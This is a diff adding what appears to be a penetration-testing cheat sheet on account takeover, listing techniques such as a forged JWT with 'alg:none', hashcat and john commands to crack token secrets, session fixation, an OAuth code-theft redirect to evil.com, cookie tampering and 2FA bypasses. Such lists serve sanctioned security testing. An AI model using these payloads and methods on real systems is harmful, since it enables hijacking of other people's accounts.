@@ -1,0 +1,57 @@
+# ============================================================
+# Account Takeover — Token / Session Hijacking
+# ============================================================
+
+# ---- JWT Attacks ----
+# alg:none bypass
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+
+# alg confusion RS256 → HS256 (sign with public key)
+# Use RS256 public key as HMAC secret
+
+# Weak secret brute force
+# hashcat -a 0 -m 16500 <jwt> /usr/share/wordlists/rockyou.txt
+# john --wordlist=rockyou.txt --format=HMAC-SHA256 <jwt>
+
+# ---- Session Fixation ----
+# 1. Attacker gets session ID from login page (unauthenticated)
+# 2. Attacker sends victim link: https://target.com/login?sessionid=ATTACKER_SESSION
+# 3. Victim logs in → session ID doesn't rotate → attacker uses same session
+
+# ---- CSRF Token Reuse ----
+# Obtain CSRF token from one session, use in another
+# Reuse CSRF token after logout
+# Use another user's CSRF token
+
+# ---- OAuth Token Theft ----
+# Steal code parameter via open redirect
+# https://target.com/oauth?redirect_uri=https://evil.com
+# Abuse state parameter fixation
+
+# ---- Magic Link Attacks ----
+# Brute force short magic links
+# Reuse already-clicked links (no single-use enforcement)
+# Predict next token value
+
+# ---- Cookie Manipulation ----
+# Flip boolean in cookie: admin=false → admin=true
+# Base64 decode, modify, re-encode: dXNlcg== → YWRtaW4=
+# Change user ID in cookie: user_id=100 → user_id=1
+
+# ---- Remember-Me Token Reuse ----
+# Remember-me tokens not invalidated on password change
+# Not invalidated on logout
+# Shared between accounts
+
+# ---- Account Merge Attacks ----
+# Register with victim email before they do
+# Link attacker OAuth account to victim account
+# Pre-hijack account before victim registers
+
+# ---- 2FA Bypass ----
+# Skip 2FA step entirely (remove X-OTP header or skip /verify endpoint)
+# Reuse OTP code
+# OTP code in response body or error message
+# Brute force 6-digit OTP (rate limit bypass)
+# Use backup code
+# SIM swap
